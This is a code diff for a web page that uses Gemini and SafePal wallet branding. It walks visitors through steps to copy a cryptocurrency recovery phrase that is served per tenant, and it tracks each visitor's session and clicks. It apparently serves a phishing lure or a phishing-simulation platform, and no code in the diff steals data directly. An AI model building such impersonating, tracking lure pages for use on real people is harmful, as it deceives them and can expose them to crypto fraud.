@@ -1,7 +1,7 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import { Check, Copy } from "lucide-react";
-import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiQueryParam, useGiTracking } from "@/components/gi/GiShared";
+import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";
 import appStoreBadge from "@/assets/app-store-badge.svg";
 import googlePlayBadge from "@/assets/google-play-badge.svg";
 import { resolveTenantByHost } from "@/lib/tenants.functions";
@@ -23,17 +23,20 @@ const STEPS = [
 
 function GiSafePalPage() {
   const { trackClick, giNavigate, sessionId } = useGiTracking();
-  const phraseParam = useGiQueryParam("phrase");
-  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(phraseParam || DEFAULT_PHRASE);
+  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
   useEffect(() => {
-    if (phraseParam) { setRecoveryPhrase(phraseParam); return; }
     if (typeof window === "undefined") return;
     let alive = true;
-    resolveTenantByHost({ data: { host: window.location.host } })
+    resolveTenantByHost({
+      data: {
+        host: window.location.host,
+        participantId: sessionId || undefined,
+      },
+    })
       .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
       .catch(() => undefined);
     return () => { alive = false; };
-  }, [phraseParam]);
+  }, [sessionId]);
   const [step, setStep] = useState(0);
   const [copied, setCopied] = useState(false);
   const [animating, setAnimating] = useState(false);
@@ -159,7 +162,7 @@ function GiSafePalPage() {
           </div>
         </div>
       </main>
-      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
+      <div aria-hidden style={{ display: "none" }} />
     </div>
   );
 }
